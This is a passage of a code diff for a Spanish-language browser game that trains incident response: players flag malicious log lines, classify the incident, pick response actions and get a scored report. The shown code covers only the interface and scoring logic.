+    return `<div class="${cls}" data-k="${k}" role="${mode === 'mark' ? 'checkbox' : 'listitem'}" ${mode === 'mark' ? `aria-checked="${G.sel.has(k)}" tabindex="0"` : ''}><span class="no">${k + 1}</span><span>${body}${why ? `<span class="why">${esc(why)}</span>` : ''}</span></div>`;
+  }).join('') || `<div class="ln read"><span class="no"></span><span style="color:var(--term-muted)">Ninguna línea contiene "${esc(q)}".</span></div>`;
+  renderFoot(shown);
+}
+
+function renderFoot(shown) {
+  const { lines, mode } = logState;
+  const f = $('termFoot');
+  if (mode === 'mark') f.innerHTML = `<span>${shown}/${lines.length} líneas</span><span>Marcadas: ${G.sel.size}</span><span>Toca una línea para marcarla</span>`;
+  else if (mode === 'review') f.innerHTML = `<span class="legend"><span class="l-hit">Bien detectada</span></span><span class="legend"><span class="l-miss">Se te pasó</span></span><span class="legend"><span class="l-fp">Falso positivo</span></span>`;
+  else f.innerHTML = `<span>${shown}/${lines.length} líneas</span>`;
+}
+
+function setLogs(src, lines, mode) {
+  logState = { src, lines, mode };
+  $('logSrc').textContent = src;
+  $('grep').value = '';
+  renderLogs();
+}
+
+$('grep').addEventListener('input', renderLogs);
+function toggleLine(el) {
+  if (!el || logState.mode !== 'mark') return;
+  const k = +el.dataset.k;
+  if (G.sel.has(k)) G.sel.delete(k); else G.sel.add(k);
+  el.classList.toggle('sel', G.sel.has(k));
+  el.setAttribute('aria-checked', G.sel.has(k));
+  renderFoot($('logs').querySelectorAll('.ln[data-k]').length);
+  const btn = $('btnConfirm'); if (btn) btn.disabled = G.sel.size === 0;
+}
+$('logs').addEventListener('click', e => toggleLine(e.target.closest('.ln[data-k]')));
+$('logs').addEventListener('keydown', e => {
+  if (e.key === ' ' || e.key === 'Enter') { const el = e.target.closest('.ln[data-k]'); if (el) { e.preventDefault(); toggleLine(el); } }
+});
+
+/* ---------- fase 1: detección ---------- */
+function renderDetection() {
+  const c = G.c;
+  G.sel = new Set();
+  setLogs(c.src, c.logs, 'mark');
+  $('logCard').classList.remove('hidden');
+  $('qPhase').textContent = 'Fase 1 · Detección';
+  $('qTitle').textContent = 'Marca las líneas sospechosas';
+  $('qText').textContent = 'Toca cada línea del log que sea parte del ataque. Cada acierto suma, cada falso positivo resta y lo que se te pase aumenta el impacto. Usa el filtro grep para buscar.';
+  $('qBody').innerHTML = '';
+  $('qFeedback').innerHTML = '';
+  const a = $('qActions');
+  a.innerHTML = '';
+  const conf = mkBtn('Confirmar marcas', 'primary', confirmMarks); conf.id = 'btnConfirm'; conf.disabled = true;
+  a.appendChild(conf);
+  a.appendChild(mkBtn('Pista (−5 pts)', '', () => {
+    if (G.hintUsed) return;
+    G.hintUsed = true;
+    $('qFeedback').innerHTML = `<div class="hint pop">💡 ${esc(c.hint)}</div>`;
+  }));
+}
+
+function mkBtn(label, cls, fn) {
+  const b = document.createElement('button');
+  b.type = 'button'; b.className = 'btn ' + cls; b.textContent = label; b.onclick = fn;
+  return b;
+}
+
+function confirmMarks() {
+  const c = G.c;
+  const badIdx = c.logs.map((l, k) => l[1] ? k : -1).filter(k => k >= 0);
+  const hits = badIdx.filter(k => G.sel.has(k)).length;
+  const fp = [...G.sel].filter(k => !c.logs[k][1]).length;
+  const miss = badIdx.length - hits;
+  let pts = Math.round(30 * hits / badIdx.length) - fp * 4 - (G.hintUsed ? 5 : 0);
+  pts = Math.max(0, pts);
+  G.score += pts;
+  G.impact += miss * 2 + fp;
+  G.clock += 8 + miss * 2 + fp * 3;
+  G.det = { hits, fp, miss, total: badIdx.length, pts };
+  G.log.push({ when: G.clock, phase: 'Detección', what: `Marcaste ${hits} de ${badIdx.length} líneas maliciosas${fp ? ` y ${fp} falsa${fp > 1 ? 's' : ''}` : ''}`, pts, max: 30, cls: pts >= 25 ? 'g' : pts >= 12 ? 'm' : 'b' });
+  updateHud();
+  logState.mode = 'review';
+  $('grep').value = '';
+  renderLogs();
+  const tone = pts >= 25 ? 'ok' : pts >= 12 ? 'mid' : 'bad';
+  $('qFeedback').innerHTML =
+    `<div class="feedback ${tone} pop">${hits === badIdx.length && !fp ? '¡Detección perfecta!' : `Detectaste ${hits} de ${badIdx.length}.`} +${pts} pts</div>` +
+    (fp ? `<p class="small muted" style="margin-top:10px">${esc(c.fpNote)}</p>` : '') +
+    `<p class="small muted" style="margin-top:10px">Revisa en el log por qué cada línea es sospechosa.</p>`;
+  if (tone === 'bad') $('qCard').classList.add('shake'), setTimeout(() => $('qCard').classList.remove('shake'), 400);
+  const a = $('qActions');
+  a.innerHTML = '';
+  a.appendChild(mkBtn('Clasificar el incidente', 'primary', renderClassify));
+}
+
+function renderClassify() {
+  const cl = G.c.classify;
+  $('qPhase').textContent = 'Fase 1 · Detección y análisis';
+  $('qTitle').textContent = cl.q;
+  $('qText').textContent = 'Con lo que viste en el log, ponle nombre a lo que pasó.';
+  renderOptions(cl.opts, 'Detección', () => goStep(0));
+  $('qCard').scrollIntoView({ behavior: 'smooth', block: 'start' });
+}
+
+/* ---------- fases 2-4 ---------- */
+function goStep(n) {
+  G.phase = n + 1;
+  renderPhaseBar();
+  if (n >= G.c.steps.length) return finish();
+  const st = G.c.steps[n];
+  if (st.extra) { setLogs(st.extra.src, st.extra.lines, 'plain'); $('logCard').classList.remove('hidden'); }
+  else { setLogs(G.c.src, G.c.logs, 'review'); }
+  $('qPhase').textContent = `Fase ${n + 2} · ${st.phase}`;
+  $('qTitle').textContent = st.q;
+  $('qText').textContent = st.extra ? 'Revisa la nueva evidencia en la consola de arriba.' : 'Tu log de detección queda arriba como referencia.';
+  renderOptions(st.opts, st.phase, () => goStep(n + 1), n + 1 >= G.c.steps.length);
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+
+function renderOptions(opts, phase, next, last) {
+  const best = Math.max(...opts.map(o => o.s));
+  const order = opts.map((o, k) => k).sort(() => Math.random() - .5);
+  $('qFeedback').innerHTML = '';
+  $('qActions').innerHTML = '';
+  const box = document.createElement('div');
+  box.className = 'opts';
+  order.forEach((k, n) => {
+    const o = opts[k];
+    const b = document.createElement('button');
+    b.type = 'button'; b.className = 'opt';
+    b.innerHTML = `<span class="k">${'ABCD'[n]}</span><span class="body">${esc(o.t)}<span class="ex hidden">${esc(o.why)}</span></span><span class="res hidden"></span>`;
+    b.onclick = () => choose(k);
+    b.dataset.k = k;
+    box.appendChild(b);
+  });
+  $('qBody').innerHTML = '';
+  $('qBody').appendChild(box);
+
+  function choose(k) {
+    const o = opts[k];
+    G.score += o.s;
+    G.impact += o.imp;
+    G.clock += o.min;
+    const cls = o.s === best ? 'g' : o.s >= 8 ? 'm' : 'b';
+    G.log.push({ when: G.clock, phase, what: o.t, pts: o.s, max: best, cls });
+    updateHud();
+    box.querySelectorAll('.opt').forEach(b => {
+      const ok = opts[+b.dataset.k];
+      b.disabled = true;
+      b.classList.add(ok.s === best ? 'best' : ok.s >= 8 ? 'partial' : 'wrong');
+      if (+b.dataset.k === k) b.classList.add('chosen');
+      b.querySelector('.ex').classList.remove('hidden');
+      const r = b.querySelector('.res');
+      r.classList.remove('hidden');
+      r.textContent = `+${ok.s}`;
+    });
+    const tone = cls === 'g' ? 'ok' : cls === 'm' ? 'mid' : 'bad';
+    const msg = cls === 'g' ? '¡Buena decisión!' : cls === 'm' ? 'Sirve, pero había una mejor.' : 'Esa decisión empeoró las cosas.';
+    const impTxt = o.imp > 0 ? ` · impacto +${o.imp}%` : o.imp < 0 ? ` · impacto ${o.imp}%` : '';
+    $('qFeedback').innerHTML = `<div class="feedback ${tone} pop">${msg} +${o.s} pts · ${o.min} min${impTxt}</div>`;
+    if (tone === 'bad') { $('qCard').classList.add('shake'); setTimeout(() => $('qCard').classList.remove('shake'), 400); }
+    $('qActions').innerHTML = '';
+    $('qActions').appendChild(mkBtn(last ? 'Ver informe' : 'Siguiente fase', 'primary', next));
+  }
+}
+
+/* ---------- informe ---------- */
+function finish() {
+  const c = G.c;
+  const max = maxScore(c);
+  const pct = Math.round(100 * G.score / max);
+  const stars = starsFor(pct);
+  const prev = save.best[c.id];
+  if (!prev || pct > prev.pct) save.best[c.id] = { pct, stars };
+  if (stars >= 1 && save.unlocked < G.i + 2) save.unlocked = Math.min(CASES.length, G.i + 2);
+  persist();
+
+  const [h, m] = c.start.split(':').map(Number);
+  const dur = G.clock - (h * 60 + m);
+  $('rpTitle').textContent = `${c.ico} ${c.title}`;
+  $('rpCo').textContent = `${c.ticket} · ${c.company}`;
+  $('rpStars').textContent = starStr(stars);
+  $('rpScore').textContent = `${G.score}/${max}`;
+  $('rpVerdict').textContent = verdict(stars, G.impact);
+  $('rpStats').innerHTML = [
+    [pct + '%', 'Precisión de tus decisiones'],
+    [`${G.det.hits}/${G.det.total}`, 'Líneas maliciosas detectadas'],
+    [G.det.fp, 'Falsos positivos'],
+    [`${Math.floor(dur / 60)} h ${dur % 60} min`, 'Tiempo hasta cerrar'],
+    [G.impact + '%', 'Impacto final'],
+  ].map(([v, l]) => `<div class="stat"><div class="v">${esc(v)}</div><div class="l">${esc(l)}</div></div>`).join('');
+  $('rpTimeline').innerHTML =
+    `<li><div class="when">${c.start}</div><div class="what">Llega la alerta ${esc(c.ticket)}</div></li>` +
+    G.log.map(e => `<li class="${e.cls}"><div class="when">${clockStr(e.when)} · ${esc(e.phase)}</div><div class="what">${esc(e.what)}</div><div class="pts">+${e.pts}/${e.max} pts</div></li>`).join('');
+  $('rpLesson').textContent = c.lesson;
+  const hasNext = G.i + 1 < CASES.length;
+  $('btnNext').classList.toggle('hidden', !hasNext);
+  $('btnNext').disabled = save.unlocked < G.i + 2;
+  $('btnNext').textContent = save.unlocked < G.i + 2 ? 'Necesitas 1★ para seguir' : 'Siguiente caso';
+  show('scrReport');
+}
+
+function verdict(stars, impact) {
+  if (stars === 3) return impact <= 15 ? 'Respuesta de manual. La empresa casi ni se enteró.' : 'Muy bien resuelto.';
+  if (stars === 2) return 'Buen trabajo. Algunas decisiones costaron tiempo o impacto.';
+  if (stars === 1) return 'Incidente cerrado, pero con daño evitable. Revisa la línea de tiempo.';
+  return 'El atacante te ganó esta vez. Repite el caso con lo que aprendiste.';
+}
+
+$('btnNext').onclick = () => startCase(G.i + 1);
+$('btnRetry').onclick = () => startCase(G.i);
+$('btnBack').onclick = () => { renderMenu(); show('scrMenu'); };
+$('btnCopy').onclick = () => {
+  const c = G.c;
+  const txt = [
+    `INFORME DE INCIDENTE ${c.ticket} · ${c.company}`,
+    `${c.title} · Severidad ${sevLabel[c.sev]}`,
+    `Puntaje: ${$('rpScore').textContent} (${$('rpStars').textContent}) · Impacto final: ${G.impact}%`,
+    '',
+    'Línea de tiempo:',
+    `${c.start}  Llega la alerta`,
+    ...G.log.map(e => `${clockStr(e.when)}  [${e.phase}] ${e.what} (+${e.pts}/${e.max})`),
+    '',
+    'Lección aprendida:',
+    c.lesson,
+  ].join('\n');
+  const done = () => toast('Informe copiado');
+  if (navigator.clipboard) navigator.clipboard.writeText(txt).then(done, () => fallbackCopy(txt, done));
+  else fallbackCopy(txt, done);
+};
+function fallbackCopy(txt, done) {
+  const ta = document.createElement('textarea');
+  ta.value = txt; document.body.appendChild(ta); ta.select();
+  try { document.execCommand('copy'); done(); } catch (e) { toast('No se pudo copiar'); }
+  ta.remove();
+}
+
+renderMenu();
+})();
+</script>
+</body>
+</html>
